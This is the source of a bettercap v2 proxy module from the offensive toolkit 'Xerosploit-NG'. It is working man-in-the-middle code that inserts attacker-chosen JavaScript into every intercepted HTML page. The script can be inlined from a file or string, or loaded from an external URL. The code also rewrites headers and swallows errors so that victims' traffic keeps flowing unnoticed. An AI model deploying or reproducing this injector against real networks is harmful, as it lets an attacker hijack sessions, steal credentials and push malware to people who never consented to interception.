// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- InjectJs
//
// Injects JavaScript into every proxied text/html response, right before
// </head> (with a </body> / end-of-document fallback).
//
// Ported from the bettercap v1 Ruby proxy module:
//   lib/bettercap/proxy/http/modules/injectjs.rb   (GPLv3)
//
// NOTE / PORT-SPEC section 5: the Xerosploit "Inject Javascript" entry may
// instead use bettercap's built-in `set http.proxy.injectjs <path-or-raw>`.
// This module is provided for parity and for callers that prefer a scriptable
// module (e.g. `http.proxy.script`), and additionally understands the
// XE_JS_URL global so a <script src=...> can be injected.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_JS_FILE  absolute path of a JS file to inline   (highest priority)
//   XE_JS_DATA  raw JavaScript string to inline        (fallback)
//   XE_JS_URL   external script URL                    (last resort)
//
// Strict passthrough: anything that is not text/html is left untouched, and
// any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "injectjs";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

// Wrap raw JavaScript in a <script> tag unless it already looks like markup
// (mirrors v1 injectjs.rb: add the wrapper only when "<script" is absent).
function xeWrapScript(js) {
    if (typeof js !== "string" || js.length === 0) { return null; }
    if (js.toLowerCase().indexOf("<script") !== -1) { return js; }
    return "<script type=\"text/javascript\">\n" + js + "\n</script>";
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

function onLoad() {
    var f = (typeof XE_JS_FILE === "undefined") ? null : XE_JS_FILE;
    var d = (typeof XE_JS_DATA === "undefined") ? null : XE_JS_DATA;
    var u = (typeof XE_JS_URL === "undefined") ? null : XE_JS_URL;
    xeLog("loaded (js_file=" + f + ", js_data=" + (d ? "<" + d.length + " bytes>" : null) + ", js_url=" + u + ")");
}

function onResponse(req, res) {
    try {
        if (!xeIsHtml(res)) { return; }                                  // strict passthrough

        var jsFile = (typeof XE_JS_FILE === "undefined") ? null : XE_JS_FILE;
        var jsData = (typeof XE_JS_DATA === "undefined") ? null : XE_JS_DATA;
        var jsUrl = (typeof XE_JS_URL === "undefined") ? null : XE_JS_URL;

        var snippet = null;
        if (jsFile) {
            snippet = xeWrapScript(xeReadFile(jsFile));
        } else if (jsData) {
            snippet = xeWrapScript("" + jsData);
        } else if (jsUrl) {
            snippet = "<script src=\"" + jsUrl + "\" type=\"text/javascript\"></script>";
        }

        if (!snippet) { xeWarn("no XE_JS_FILE / XE_JS_DATA / XE_JS_URL set; passing through"); return; }

        var body = xeReadBody(res);
        if (typeof body !== "string" || body.length === 0) { return; }

        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting javascript into " + where);

        xeSetBody(res, xeInjectBeforeCloseTag(body, snippet));
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
